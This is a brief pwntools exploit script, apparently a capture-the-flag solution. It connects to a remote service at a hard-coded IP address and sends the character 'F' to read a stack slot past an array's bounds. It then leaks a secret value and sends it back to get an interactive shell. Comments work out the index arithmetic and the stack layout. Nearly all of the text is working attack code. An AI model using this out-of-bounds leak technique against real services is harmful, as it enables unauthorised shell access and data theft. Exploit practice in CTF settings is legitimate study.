from pwn import  * 

p = process("./main")
p = remote("35.159.81.154", 1341)
p.recvuntil(b"Give me the index of the public key you want to read")

p.sendline(b"F") # we need to leak the address of the stack at 22
# so we need auStack_68[input[0] + -48] => input[0] -48 = 22 => input[0] = 70 (ord(F))
p.recvline()
payload = p.recvline().strip()

p.recvuntil(b"If you have the secret value, I will give you a shell")
p.sendline(payload)
p.interactive()


# ---------------------------------------------------
# auStack_68[0]   = 0x1337
# auStack_68[1]   = 0x1338
# ...
# auStack_68[19]  = 0x134a
# auStack_68[20]  = ...
# auStack_68[21]  = ..
# 
# local_10        = 0x9876   <--- secret key
# ---------------------------------------------------
